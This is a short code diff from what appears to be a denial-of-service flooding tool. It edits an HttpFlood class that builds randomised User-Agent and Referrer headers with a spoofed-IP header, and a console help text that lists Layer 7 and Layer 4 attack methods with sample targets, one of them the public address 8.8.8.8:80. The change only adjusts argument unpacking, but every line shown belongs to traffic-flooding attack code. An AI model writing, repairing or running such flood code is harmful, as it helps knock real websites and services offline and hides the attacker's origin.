@@ -299,8 +299,8 @@ class HttpFlood(Thread):
     @property
     def randHeadercontent(self) -> str:
         payload: str = ""
-        payload += f"User-Agent: {ProxyTools.Random.rand_choice(self._useragents)}\r\n"
-        payload += f"Referrer: {ProxyTools.Random.rand_choice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
+        payload += f"User-Agent: {ProxyTools.Random.rand_choice(*self._useragents)}\r\n"
+        payload += f"Referrer: {ProxyTools.Random.rand_choice(*self._referers)}{parse.quote(self._target.human_repr())}\r\n"
         payload += self.SpoofIP
         return payload
 
@@ -711,14 +711,14 @@ class ToolsConsole:
                                                         ", ".join(["TOOLS", "HELP", "STOP"]), 3,
                                                         len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                                                         argv[0],
-                                                        ProxyTools.Random.rand_choice([*Methods.LAYER7_METHODS]),
+                                                        ProxyTools.Random.rand_choice(*Methods.LAYER7_METHODS),
                                                         "https://example.com",
                                                         ProxyTools.Random.rand_choice([4, 5, 1, 0]),
                                                         ProxyTools.Random.rand_int(850, 1000),
                                                         ProxyTools.Random.rand_int(50, 100),
                                                         ProxyTools.Random.rand_int(1000, 3600),
                                                         argv[0],
-                                                        ProxyTools.Random.rand_choice([*Methods.LAYER4_METHODS]),
+                                                        ProxyTools.Random.rand_choice(*Methods.LAYER4_METHODS),
                                                         "8.8.8.8:80",
                                                         ProxyTools.Random.rand_int(850, 1000),
                                                         ProxyTools.Random.rand_int(1000, 3600)
